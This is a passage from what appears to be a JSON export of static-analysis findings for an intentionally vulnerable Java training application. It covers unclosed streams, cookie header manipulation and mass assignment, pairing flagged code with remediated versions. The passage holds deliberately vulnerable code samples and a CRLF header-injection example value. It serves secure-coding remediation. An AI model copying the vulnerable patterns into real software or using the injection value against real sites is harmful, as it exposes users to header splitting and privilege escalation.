"src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00269", "function": "inputStream = new FileInputStream(...)", "line": "388", "snippet": "String randomFileName=\"File\"+getDateTimeStamp()+\"_\"+rand_int+\".txt\";\n\t       \n\t        InputStream inputStream = new FileInputStream(fileToDownload);\n\t        response.setContentType(\"application/force-download\");\n\t        response.setHeader(\"Content-Disposition\", \"attachment; filename=\\\\\"+randomFileName+\"\\\";\");"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00270", "function": "stream = new BufferedOutputStream(new java.io.FileOutputStream())", "line": "262", "snippet": "*/\n\t\t\t\t\t\t\n\t\t\t\t\t\tBufferedOutputStream stream = new BufferedOutputStream(new FileOutputStream(serverFile));\n\t\t\t\t\t\tstream.write(bytes);\n\t\t\t\t\t\tstream.close();"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00271", "function": "zipIn = new ZipInputStream(file.getInputStream())", "line": "285", "snippet": "destDir.mkdir();\n\t\t        }\n\t\t        ZipInputStream zipIn = new ZipInputStream(file.getInputStream());\n\t\t        ZipEntry entry = zipIn.getNextEntry();\n\t\t        // iterates over entries in the zip file"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00272", "function": "getInputStream()", "line": "627", "snippet": "//Do unmarshall operation\n\t        Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(),\n\t                                        new InputSource(file.getInputStream()));\n\n\t\t\tjaxbContext = JAXBContext.newInstance(EmployeeDtlsBean.class);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00273", "function": "fileOut = new FileOutputStream(...)", "line": "442", "snippet": "File file = new File(fileName);\n\t\t\tFileOutputStream fileOut = new FileOutputStream(file);\n\t\t\tprop.store(fileOut, \"writing encrypted password\");"}]}], "remediation": {"remediation": {"@id": "R.0064", "@name": "Unreleased Resource: Streams", "@dateLastModified": "7/8/2020", "faqs": null, "recommendations": {"recommendation": [{"@type": "Java/JSP", "vulncode": "public void downloadFile(HttpSession session,HttpServletResponse response) throws Exception {\n\t    try {\n\t        String filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t        System.out.println(&quot;filePath---&quot; +filePath);\n\t        String fileName = filePath + &quot;file.txt&quot;;\n\t        System.out.println(&quot;fileName---&quot;+fileName);\n\t        File fileToDownload = new File(fileName);\n                           \n\t        InputStream inputStream = new FileInputStream(fileToDownload); \n\t        response.setContentType(&quot;application/force-download&quot;);\n\t        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=&quot;+fileName+&quot;.txt&quot;); \n\t        IOUtils.copy(inputStream, response.getOutputStream());\n\t        response.flushBuffer();\n\t      <em class=\"red\">  inputStream.close();</em>//This code might not be executed incase of failure\n\t    } catch (Exception e){\t        \n\t        e.printStackTrace();\n\t    }\n\t}", "nonvulncode": "public void downloadFile(HttpSession session,HttpServletResponse response) throws Exception {\n\t    try {\n\t        String filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t        System.out.println(&quot;filePath---&quot; +filePath);\n\t        String fileName = filePath + &quot;file.txt&quot;;\n\t        System.out.println(&quot;fileName---&quot;+fileName);\n\t        File fileToDownload = new File(fileName);\n                           \n\t        InputStream inputStream = new FileInputStream(fileToDownload);<em class=\"red\"> </em>\n\t        response.setContentType(&quot;application/force-download&quot;);\n\t        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=&quot;+fileName+&quot;.txt&quot;); \n\t        IOUtils.copy(inputStream, response.getOutputStream());\n\t        response.flushBuffer();\n\t    } catch (Exception e){\t        \n\t        e.printStackTrace();\n\t    }finally\n                       {\n                              if (inputStream != null)\n                               <em class=\"blue\">inputStream.close();</em>\n                        }\n\t}", "comments": "Using try catch finally with Dispose method call in finally block will always be called even there's an exception thrown.", "impact": "No impact on the performance or functionality on applying this change.\nThe change will improve the garbage collector process.", "abstract": "Use of finally"}, {"@type": "Java/JSP", "vulncode": "public void downloadFile(HttpSession session,HttpServletResponse response) throws Exception {\n\t    try {\n\t        String filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t        System.out.println(&quot;filePath---&quot; +filePath);\n\t        String fileName = filePath + &quot;file.txt&quot;;\n\t        System.out.println(&quot;fileName---&quot;+fileName);\n\t        File fileToDownload = new File(fileName);\n                           \n\t        InputStream inputStream = new FileInputStream(fileToDownload); \n\t        response.setContentType(&quot;application/force-download&quot;);\n\t        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=&quot;+fileName+&quot;.txt&quot;); \n\t        IOUtils.copy(inputStream, response.getOutputStream());\n\t        response.flushBuffer();\n\t      <em class=\"red\">  inputStream.close();</em>//This code might not be executed incase of failure\n\t    } catch (Exception e){\t        \n\t        e.printStackTrace();\n\t    }\n\t}", "nonvulncode": "public void downloadFile(HttpSession session,HttpServletResponse response) throws Exception {\n\t    try {\n\t        //String filePath = System.getProperty(&quot;catalina.home&quot;) + &quot;\\\\tmpFiles\\\\&quot;;\n\t    \tString filePath = System.getProperty(&quot;catalina.home&quot;) + File.separator +  &quot;tmpFiles&quot; + File.separator ;\n\t        System.out.println(&quot;filePath---&quot; +filePath);\n\t        String fileName = filePath + &quot;file.txt&quot;;\n\t        System.out.println(&quot;fileName---&quot;+fileName);\n\t        File fileToDownload = new File(fileName);\n\t      <em class=\"blue\">  try (InputStream inputStream = new FileInputStream(fileToDownload))</em>\n\t        {\n\t\t        response.setContentType(&quot;application/force-download&quot;);\n\t\t        response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment; filename=&quot;+fileName+&quot;.txt&quot;); \n\t\t        IOUtils.copy(inputStream, response.getOutputStream());\n\t\t        response.flushBuffer();\n\t\t        inputStream.close();\n\t        }\n\t    } catch (Exception e){\t        \n\t        e.printStackTrace();\n\t    }\n\n\t}", "comments": "We can use try-with-resources statement in java to automatically disposed the object once it is already outside of the block even there's an exception in between.", "impact": "No impact on the performance or functionality on applying this change.\nThe change will improve the garbage collector process.", "abstract": "Use of try-with-resources"}, {"@type": ".NET/C#/ASP", "vulncode": "string filePath = AppDomain.CurrentDomain.BaseDirectory.ToString() + &quot;\\\\Errors.txt&quot;;\n                StreamWriter writer = new StreamWriter(filePath, true, new UTF8Encoding(false));\n                    writer.WriteLine(&quot;Message: &quot; + nullex.Message + Environment.NewLine + &quot;StackTrace: &quot; + nullex.StackTrace\n                        + Environment.NewLine + &quot;Date: &quot; + DateTime.Now.ToString());\n                    writer.WriteLine(Environment.NewLine + &quot;-----------------------------------------------------------------------------&quot;\n                        + Environment.NewLine);\n\n <em class=\"red\">               writer.Close();           </em>", "nonvulncode": "string filePath = AppDomain.CurrentDomain.BaseDirectory.ToString() + &quot;\\\\Errors.txt&quot;;\n               <em class=\"blue\"> using (StreamWriter writer = new StreamWriter(filePath, true, new UTF8Encoding(false)))</em>\n                {\n                    writer.WriteLine(&quot;Message: &quot; + nullex.Message + Environment.NewLine + &quot;StackTrace: &quot; + nullex.StackTrace\n                        + Environment.NewLine + &quot;Date: &quot; + DateTime.Now.ToString());\n                    writer.WriteLine(Environment.NewLine + &quot;-----------------------------------------------------------------------------&quot;\n                        + Environment.NewLine);\n                }", "comments": "With .Net the strategy can be similar to the try-with-resource in Java. By leveraging the &quot;using&quot;, or &quot;finally&quot;, the code will automatically dispose the used stream and objects at the end of the block (even if an exception is generated).\n\nFortify observation: Fortify will not detect the issue if the creation of stream object doesn't involved three parameters (e.g.,  StreamWriter writer = new StreamWriter(filePath, true); ). By removing the 3rd parameter is not considered a fix, just a way to avoid detection by Fortify. Prefer a solution as described (leveraging &quot;using&quot; or &quot;finally&quot;)", "impact": "No impact on the performance or functionality on applying this change.\nThe change will improve the garbage collector process.", "abstract": "Use of &quot;using&quot;"}, {"@type": ".NET/C#/ASP", "vulncode": "string filePath = AppDomain.CurrentDomain.BaseDirectory.ToString() + &quot;\\\\Errors.txt&quot;;\n                 StreamWriter writer = new StreamWriter(filePath, true, new UTF8Encoding(false));\n                    writer.WriteLine(&quot;Message: &quot; + nullex.Message + Environment.NewLine + &quot;StackTrace: &quot; + nullex.StackTrace\n                        + Environment.NewLine + &quot;Date: &quot; + DateTime.Now.ToString());\n                    writer.WriteLine(Environment.NewLine + &quot;-----------------------------------------------------------------------------&quot;\n                        + Environment.NewLine);\n\n <em class=\"red\">               writer.Close();           </em>", "nonvulncode": "string filePath = AppDomain.CurrentDomain.BaseDirectory.ToString() + &quot;\\\\Errors.txt&quot;;\n                var writer = new StreamWriter(filePath, true, new UTF8Encoding(false));\n\n                try\n                {\n                    \n                    writer.WriteLine(&quot;Message: &quot; + nullex.Message + Environment.NewLine + &quot;StackTrace: &quot; + nullex.StackTrace\n                        + Environment.NewLine + &quot;Date: &quot; + DateTime.Now.ToString());\n                    writer.WriteLine(Environment.NewLine + &quot;-----------------------------------------------------------------------------&quot;\n                        + Environment.NewLine);\n                }catch\n                {\n                    ViewData[&quot;ErrorMessage&quot;] = &quot;An error occurred on this page. &quot; + ex.Message.ToString();\n                }\n              <em class=\"blue\">  finally\n                {\n                    if (writer != null)\n                        writer.Close();</em>\n                }", "comments": "With .Net the strategy can be similar to the try-with-resource in Java. By leveraging the &quot;using&quot;, or &quot;finally&quot;, the code will automatically dispose the used stream and objects at the end of the block (even if an exception is generated).\n\nFortify observation: Fortify will not detect the issue if the creation of stream object doesn't involved three parameters (e.g.,  StreamWriter writer = new StreamWriter(filePath, true); ). By removing the 3rd parameter is not considered a fix, just a way to avoid detection by Fortify. Prefer a solution as described (leveraging &quot;using&quot; or &quot;finally&quot;)", "impact": "No impact on the performance or functionality on applying this change.\nThe change will improve the garbage collector process.", "abstract": "Use of finally"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Header Manipulation: Cookies": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00290", "function": "javax.servlet.http.Cookie.Cookie()", "line": "214", "snippet": "session.setAttribute(\"pwd\", request.getParameter(\"pwd\"));\n\n\t\t\tCookie userRole = new Cookie(\"userRole\", bean.getRoleID());\n\t\t\tuserRole.setHttpOnly(true); // vul 0056, 0078, 0004\n\t\t\tuserRole.setSecure(true);"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00291", "function": "javax.servlet.http.Cookie.Cookie()", "line": "222", "snippet": "Cookie userName = new Cookie(\"userName\", bean.getUserName());\n\t\t\t response.addCookie(userName);"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00292", "function": "javax.servlet.http.Cookie.Cookie()", "line": "222", "snippet": "Cookie userName = new Cookie(\"userName\", bean.getUserName());\n\t\t\t response.addCookie(userName);"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00293", "function": "javax.servlet.http.Cookie.Cookie()", "line": "214", "snippet": "session.setAttribute(\"pwd\", request.getParameter(\"pwd\"));\n\n\t\t\tCookie userRole = new Cookie(\"userRole\", bean.getRoleID());\n\t\t\tuserRole.setHttpOnly(true); // vul 0056, 0078, 0004\n\t\t\tuserRole.setSecure(true);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00294", "function": "javax.servlet.http.Cookie.Cookie()", "line": "187", "snippet": "HttpSession session = request.getSession();\n\t    session.setAttribute(\"color\", value);\n\t    response.addCookie(new Cookie(\"color\", value)); //cwe 312 Cleartext Storage of Sensitive Information ->Improper Neutralization of CRLF Sequences in HTTP Headers, Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\n\t    System.out.format(value); //CWE134_Uncontrolled_Format_String"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00295", "function": "javax.servlet.http.Cookie.Cookie()", "line": "214", "snippet": "session.setAttribute(\"pwd\", request.getParameter(\"pwd\"));\n\n\t\t\tCookie userRole = new Cookie(\"userRole\", bean.getRoleID());\n\t\t\tuserRole.setHttpOnly(true); // vul 0056, 0078, 0004\n\t\t\tuserRole.setSecure(true);"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00296", "function": "javax.servlet.http.Cookie.Cookie()", "line": "222", "snippet": "Cookie userName = new Cookie(\"userName\", bean.getUserName());\n\t\t\t response.addCookie(userName);"}]}], "remediation": {"remediation": {"@id": "R.0101", "@name": "Header Manipulation: Cookies", "@dateLastModified": "2/10/2021", "faqs": {"faq": [{"question": "This vulnerability keeps showing up on the report, but we are not able to exploit it... Is the system vulnerable?", "answer": "There are 2 layers of protections against this vulnerability, one is created by the modern application servers, that encode CRLF in all headers (e.g., fixes for the Apache HTTPD: mod_userdir CRLF injection/CVE-2016-4975) and the second is on the code to encode CRLF injected from user input. It is better to not rely only on the application server protections and fix the code using an encoder, as future modules loaded on the server may introduce the vulnerability again to the system."}, {"question": "Even after using URLEncoder, the scanner keep taging as an issue... why?", "answer": "In this case, it is a &quot;false positive&quot;:  The proper use of URLEncoder will prevent this vulnerability, but scanners are not able to validate the logic used, and the scanner policy is to keep presenting as a vulnerability and wait for a manual validation."}]}, "recommendations": {"recommendation": [{"@type": "JAVA/JSP", "vulncode": "public ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString password = request.getParameter(&quot;pwd&quot;);\n\t\t\n\t\tbean=new LoginBean();\n\t\tbean.setUserName(uname);\n\t\tbean.setPassword(request.getParameter(&quot;pwd&quot;));\n\t\t\t\t\n\t\tString res = dao.validateLogin(bean);\t\t\n\t\tModelAndView mv= new ModelAndView();\n\t\t\n\t\tif(res.equals(&quot;success&quot;))\n\t\t{\n\t\t\tmv.setViewName(&quot;success&quot;);\n\t\t\tmv.addObject(&quot;msg&quot;, &quot;Welcome &quot; + bean.getUserName());\n\t\t\tmv.addObject(&quot;userObj&quot;, bean);\n\t\t\tsess.setAttribute(&quot;loginBean&quot;, bean); \n\t\t\t\n\t\t\tHttpSession session = request.getSession();\n\t\t    session.setAttribute(&quot;userRole&quot;, bean.getRoleID());\n\t\t    session.setAttribute(&quot;userName&quot;, bean.getUserName());\n\n\t\t\t<em class=\"red\">Cookie userRole = new Cookie(&quot;userRole&quot;, bean.getRoleID());\n\t\t\tuserRole.setHttpOnly(true);\n\t\t\tuserRole.setSecure(true);\n\t\t\tresponse.addCookie(userRole);\n\t\t\t\n\t\t</em>\t<em class=\"red\">Cookie userName = new Cookie(&quot;userName&quot;, bean.getUserName());</em>\n\t\t\tuserName.setHttpOnly(true); \n\t\t\tuserName.setSecure(true);\n\t\t\tresponse.addCookie(userName);\n\n\t\t\treturn new ModelAndView(&quot;success&quot;, &quot;loginBean&quot;, bean);\n\t\t}", "nonvulncode": "public ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response)\n\t{\n\t\tString uname = request.getParameter(&quot;uname&quot;);\n\t\tString password = request.getParameter(&quot;pwd&quot;);\n\t\t\n\t\tbean=new LoginBean();\n\t\tbean.setUserName(uname);\n\t\tbean.setPassword(request.getParameter(&quot;pwd&quot;));\n\t\t\t\t\n\t\tString res = dao.validateLogin(bean);\t\t\n\t\tModelAndView mv= new ModelAndView();\n\t\t\n\t\tif(res.equals(&quot;success&quot;))\n\t\t{\n\t\t\tmv.setViewName(&quot;success&quot;);\n\t\t\tmv.addObject(&quot;msg&quot;, &quot;Welcome &quot; + bean.getUserName());\n\t\t\tmv.addObject(&quot;userObj&quot;, bean);\n\t\t\tsess.setAttribute(&quot;loginBean&quot;, bean); \n\t\t\t\n\t\t\tHttpSession session = request.getSession();\n\t\t    session.setAttribute(&quot;userRole&quot;, bean.getRoleID());\n\t\t    session.setAttribute(&quot;userName&quot;, bean.getUserName());\n\n\t\t\t<em class=\"blue\">Cookie userRole = new Cookie(&quot;userRole&quot;, URLEncoder.encode(bean.getUserRole(),&quot;UTF-8&quot;));</em>\n\t\t\tuserRole.setHttpOnly(true);\n\t\t\tuserRole.setSecure(true);\n\t\t\tresponse.addCookie(userRole);\n\t\t\t\n\t\t\t<em class=\"blue\">Cookie userName = new Cookie(&quot;userName&quot;, URLEncoder.encode(bean.getUserName(),&quot;UTF-8&quot;));</em>\n\t\t\tuserName.setHttpOnly(true); \n\t\t\tuserName.setSecure(true);\n\t\t\tresponse.addCookie(userName);\n\n\t\t\treturn new ModelAndView(&quot;success&quot;, &quot;loginBean&quot;, bean);\n\t\t}", "comments": "In the vulnerable sample, if untrusted data is added to response header, attacker can manipulate header (e.g., filename+char(13)+char(10)+X-XSS-Protection: 0 to use the cookie data to create a new header line and disable XSS protection). \nNever trust the user input in response header. Change the user cookie to contain only valid characters, and always perform a validation and sanitization of the values (e.g. by using urlEncoder.encode())\n\nOther methods of protection include performing validation against whitelist of data.\n\nFor reference: \nhttps://exploitbyte.com/crlf-injection/\nhttps://www.geeksforgeeks.org/crlf-injection-attack/\nhttps://docs.oracle.com/javase/7/docs/api/java/net/URLEncoder.html\nhttps://owasp.org/www-community/attacks/HTTP_Response_Splitting", "impact": "In case of validation/sanitization, check for special characters that are allowed to be part of the input value.\nTest the output on cookie names and possible values, including the POST and GET methods. For example: URLEncoder.encode changes the space character &quot; &quot; to the plus sign &quot;+&quot; instead of %20, and this is valid only for application/x-www-form-urlencoded URL, after the ? in the URL (e.g., https://www.eg.com/page?q=val+val2+val3)", "abstract": "Use of URLEncoder"}, {"@type": ".NET/C#/ASP", "vulncode": "public ActionResult Login_HeaderManipulation(string userName, string password,string rememberMe)\n        {\n            if (ModelState.IsValid)\n            {\n                SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n                string query = &quot;Select Password, RoleId, FirstName, LastName from dbo.Account Where Username=@Username&quot;;\n\n                SqlCommand cmd = new SqlCommand(query, conn);\n                cmd.Parameters.Add(new SqlParameter(&quot;Username&quot;,userName));\n\n                conn.Open();\n                using (SqlDataReader dr = cmd.ExecuteReader())\n                {\n                    if (dr.Read())\n                    {\n                        if (DBNull.Value != dr[&quot;Password&quot;])\n                        {\n                            if (dr[&quot;Password&quot;].ToString() == password)\n                            {\n                                Session[&quot;role&quot;] = &quot;Admin&quot;;\n                                Session[&quot;FirstName&quot;] = &quot;Admin&quot;;\n                                Session[&quot;LastName&quot;] = &quot;Admin&quot;;\n\n                                HttpCookie cookie = new HttpCookie(&quot;VulnerableApp&quot;, <em class=\"red\">rememberMe</em>);\n                                Response.Cookies.Add(cookie);\n\n                                if (Request.QueryString[&quot;ReturnUrl&quot;] != null)\n                                    FormsAuthentication.RedirectFromLoginPage(userName, true);\n                                else\n                                    return View(&quot;Main&quot;);\n                            }\n                        }\n                    }\n                }\n                conn.Close();\n            }\n\n            TempData[&quot;errmsg&quot;] = &quot;Invalid Credentials.&quot;;\n            logger.Info(&quot;Invalid Credentials for username=&quot; + userName);\n            return View();\n        }", "nonvulncode": "public ActionResult Login_HeaderManipulation(string userName, string password, string rememberMe)\n        {\n            if (ModelState.IsValid)\n            {\n                SqlConnection conn = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n                string query = &quot;Select Password, RoleId, FirstName, LastName from dbo.Account Where Username=@Username&quot;;\n\n                SqlCommand cmd = new SqlCommand(query, conn);\n                cmd.Parameters.Add(new SqlParameter(&quot;Username&quot;, userName));\n\n                conn.Open();\n                using (SqlDataReader dr = cmd.ExecuteReader())\n                {\n                    if (dr.Read())\n                    {\n                        if (DBNull.Value != dr[&quot;Password&quot;])\n                        {\n                            if (dr[&quot;Password&quot;].ToString() == password)\n                            {\n                                Session[&quot;role&quot;] = &quot;Admin&quot;;\n                                Session[&quot;FirstName&quot;] = &quot;Admin&quot;;\n                                Session[&quot;LastName&quot;] = &quot;Admin&quot;;\n                                string sanitizeRememberMe = <em class=\"blue\">AntiXssEncoder.UrlEncode(AntiXssEncoder.HtmlEncode(rememberMe, true));</em>\n                                HttpCookie cookie = new HttpCookie(&quot;VulnerableApp&quot;, sanitizeRememberMe);\n                                Response.Cookies.Add(cookie);\n\n                                if (Request.QueryString[&quot;ReturnUrl&quot;] != null)\n                                    FormsAuthentication.RedirectFromLoginPage(userName, true);\n                                else\n                                    return View(&quot;Main&quot;);\n                            }\n\n                        }\n                    }\n                }\n                conn.Close();\n            }\n\n            TempData[&quot;errmsg&quot;] = &quot;Invalid Credentials.&quot;;\n            logger.Info(&quot;Invalid Credentials for username=&quot; + userName);\n            return View();\n        }", "comments": "In the vulnerable sample, if untrusted data is added to response header, attacker can manipulate header \n(example., hacker+char(13)+HTTP/1.1 200 OK...). One option is to never trust the user input by applying URL And HTML Encoding, which will sanitize the cookie. We can use the AntiXssEncoder to encode the input. We need to import the System.Web.Security.AntiXss to used this assembly.\n\nOther methods of protection include performing validation against whitelist of data.\n\nFor reference: \nhttps://docs.microsoft.com/en-us/dotnet/api/system.net.webutility.urlencode?view=net-5.0\nhttps://docs.microsoft.com/en-us/dotnet/api/system.web.security.antixss.antixssencoder?view=netframework-4.8\nhttps://exploitbyte.com/crlf-injection/\nhttps://www.geeksforgeeks.org/crlf-injection-attack/\nhttps://docs.oracle.com/javase/7/docs/api/java/net/URLEncoder.html\nhttps://owasp.org/www-community/attacks/HTTP_Response_Splitting", "impact": "In case of validation/sanitization, check for special characters that are allowed to be part of the input value.\nTest the output on cookie names and possible values, including the POST and GET methods. For example: URLEncoder.encode changes the space character &quot; &quot; to the plus sign &quot;+&quot; instead of %20, and this is valid only for application/x-www-form-urlencoded URL, after the ? in the URL (e.g., https://www.eg.com/page?q=val+val2+val3)", "abstract": "Use of AntiXssEncoder to sanitize input"}]}, "mitigations": {"mitigation": [{"system": "Application server", "configuration": "N/A", "backend": null, "frontend": null, "comments": "This vulnerability has been fixed in most modern application servers, regardless of what language the code has been written in. Check the application server version and test if it is vulnerable to CR/LF attacks.\nReference: https://owasp.org/www-community/attacks/HTTP_Response_Splitting"}, {"system": "WebServer", "configuration": "N/A", "backend": "IIS\n&lt;configuration&gt;\n &lt;system.web&gt;\n  &lt;httpCookies sameSite=&quot;Strict&quot; requireSSL=&quot;false&quot; /&gt;\n &lt;system.web&gt;\n&lt;configuration&gt;\nApache: \nhttpd.conf\nLoadModule headers_module modules/mod_headers.so\n\nHeader edit Set-Cookie ^(.*)$ $1;SameSite=strict\n\nTomcat\ncontext.xml\n&lt;Context&gt;\n&lt;CookieProcessor \n        sameSiteCookies=&quot;strict&quot; /&gt;\n&lt;/Context&gt;", "frontend": "N/A", "comments": "SameSite can be added to cookie with the mentioned configuration. If the SameSite attribute is not configured, browser will default the value of SameSite=Lax"}]}}}}, "Mass Assignment: Insecure Binder Configuration": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00297", "function": "Function: createMail()", "line": "894", "snippet": "@RequestMapping(value = \"sendEmail.html\", method = RequestMethod.POST)\n    public ModelAndView createMail(@ModelAttribute(\"mailObject\") EmailForm mailObject,HttpServletRequest request) {\n        \n\t\tModelAndView mv = new ModelAndView();"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00298", "function": "Function: storeEmployee()", "line": "196", "snippet": "@RequestMapping(value=\"storeEmployee.html\", method=RequestMethod.POST)\n\tpublic ModelAndView storeEmployee(@ModelAttribute(\"employeeBean\") @Valid EmployeeBean employeeBean,\n\t\t\tBindingResult result)\n\t{"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00299", "function": "Function: addUser()", "line": "244", "snippet": "@RequestMapping(value=\"storeUser.html\", method= RequestMethod.POST)\n\tpublic ModelAndView addUser(@ModelAttribute(\"userAccountBean\") UserAccountBean userAccountBean,HttpServletRequest request,HttpServletResponse response) throws SQLException\n\t{\n\t\tOptional<UserAccountBean> optUserAcc = Optional.ofNullable(userAccountBean);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00300", "function": "Function: searchEmployee()", "line": "166", "snippet": "@RequestMapping(value=\"searchEmployee.html\", method={ RequestMethod.GET,RequestMethod.POST})\n\tpublic ModelAndView searchEmployee(@ModelAttribute(\"employeeSearchBean\") EmployeeSearchBean employeeSearchBean)\n\t{\t\n\t\tlogger.debug(\"Inside employee list\");"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00301", "function": "Function: validateLogin()", "line": "159", "snippet": "@RequestMapping(value=\"validate.html\", method=RequestMethod.POST)\n\tpublic ModelAndView validateLogin(@ModelAttribute LoginBean bean, HttpServletRequest request,HttpSession sess, HttpServletResponse response) throws IOException\n\t{\n\t\tlogger.info(\"Inside login validation info\");"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00302", "function": "Function: addUserProfile()", "line": "310", "snippet": "//vul 107\n\t@RequestMapping(value=\"addUserProfile.html\", method= {RequestMethod.GET,RequestMethod.POST})\n\tpublic ModelAndView addUserProfile(@ModelAttribute(\"userProfile\") UserProfileForm userProfile)\n\t{\n\t\tString isValid = \"true\";"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00303", "function": "Function: saveUserData()", "line": "336", "snippet": "@RequestMapping(value=\"addUserDataFromJson.html\", method= {RequestMethod.GET,RequestMethod.POST})\n\tpublic ModelAndView saveUserData(@ModelAttribute(\"userProfile\") UserProfileForm userProfile) {\n\t\t\n\t\tif(userProfile.getUserName()!=null) {"}]}], "remediation": {"remediation": {"@id": "R.0037", "@name": "Mass Assignment: Insecure Binder Configuration", "@dateLastModified": "1/15/2021", "faqs": {"faq": {"question": "This looks like cosmetics. Do I really need to implement this change?", "answer": "the over posting attack is known among hackers and may cause privilege escalation."}}, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult CreateUserAccess(<em class=\"red\">UserProfile userProfile</em>)\n        {\n            VulnAppDBEntities dbContext = new VulnAppDBEntities();\n            string encryptionKey = &quot;&quot;;\n\n            using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())\n            {\n                int passwordlength = Convert.ToInt32(ConfigurationManager.AppSettings[&quot;passwordlength&quot;].ToString());\n\n                byte[] randomBytes = new byte[passwordlength];\n                crypto.GetBytes(randomBytes);\n                encryptionKey = Convert.ToBase64String(randomBytes);\n            }\n\n            string passwordEncrypted = EncryptString(userProfile.Password, encryptionKey);\n\n            userProfile.Password = passwordEncrypted;\n            userProfile.EncryptionKey = encryptionKey;\n\n            dbContext.UserProfiles.Add(userProfile);\n            dbContext.SaveChanges();\n            return RedirectToAction(&quot;../UserAccess/UserAccess&quot;);\n        }", "nonvulncode": "public ActionResult CreateUserAccess(<em class=\"blue\">[Bind(Include = &quot;UserName,Password&quot;)]</em>UserProfile userProfile)\n        {\n            VulnAppDBEntities dbContext = new VulnAppDBEntities();\n            string encryptionKey = &quot;&quot;;\n\n            using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())\n            {\n                int passwordlength = Convert.ToInt32(ConfigurationManager.AppSettings[&quot;passwordlength&quot;].ToString());\n\n                byte[] randomBytes = new byte[passwordlength];\n                crypto.GetBytes(randomBytes);\n                encryptionKey = Convert.ToBase64String(randomBytes);\n            }\n\n            string passwordEncrypted = EncryptString(userProfile.Password, encryptionKey);\n\n            userProfile.Password = passwordEncrypted;\n            userProfile.EncryptionKey = encryptionKey;\n\n            dbContext.UserProfiles.Add(userProfile);\n            dbContext.SaveChanges();\n            return RedirectToAction(&quot;../UserAccess/UserAccess&quot;);\n        }", "comments": "This issue allow an attacker to perform &quot;over posting&quot; attacks. In the example the vulnerable code is exposing a form to the user asking for &quot;user name&quot; and &quot;password&quot; but the attacker can guess other fields that are part of the UserProfileModel model and forge the request to submit values for those extra fields. One typical attacker scenario is to send a new value for the &quot;role&quot; attribute, changing it to an elevated &quot;Admin&quot; value during a password change, for example.\n\nThere are many approaches to address the issue (ordered by our recommendation preference).\n- Using <em class=\"blue\">Bind(Include</em> = &lt;list of columns&gt;): This will let the application to specify the exact properties a model binder should include in binding (whitelist approach).\n- [<em class=\"blue\">Bind(Exclude</em> = &lt;list of columns&gt;: This is valid to exclude some values from the model, but harder to maintain in case the model expands in the future (blacklist approach).\n- use <em class=\"blue\">[BindNever]</em> or <em class=\"blue\">[Editable(false)]</em> in defining a model. <em class=\"blue\">[BindNever] will not bind the column as part of the model. There are some drawbacks for this approach: (1)columns cannot be use across forms if need it and (2) it is harder to perform maintenance as new functionalities may require use of cross attributed. (3) This is not an option in case using Entity Framework (EF) database approach, as you cannot create a data model from the database and any update will be lost after EF re-generate the code.\n- Create a simplified ViewModel that will only contains columns that are needed. There are some drawbacks here: (1) In this remediation scenario, the updates to the code are more complex due to the need of associating the new simplified model to the actual model (already part of entity framework - EF), besides (2) SAST tools such as Fortify will still detect this as an issue, that will require developers to justify as a false positive every time.</em>", "impact": "No impact on the performance.\nAll different approaches are valid fixes for the issue, ordered by our recommendation: \nBind(Include=\u2026) is the preferred [white list approach] due to the simplicity of the solution and easy for future maintenance. \nThe impact of each other alternative is described on the comments.", "abstract": "Using Bind to specific objects"}, {"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">LoginBean.java</em>\npublic class LoginBean {\n\t\n\tprivate String 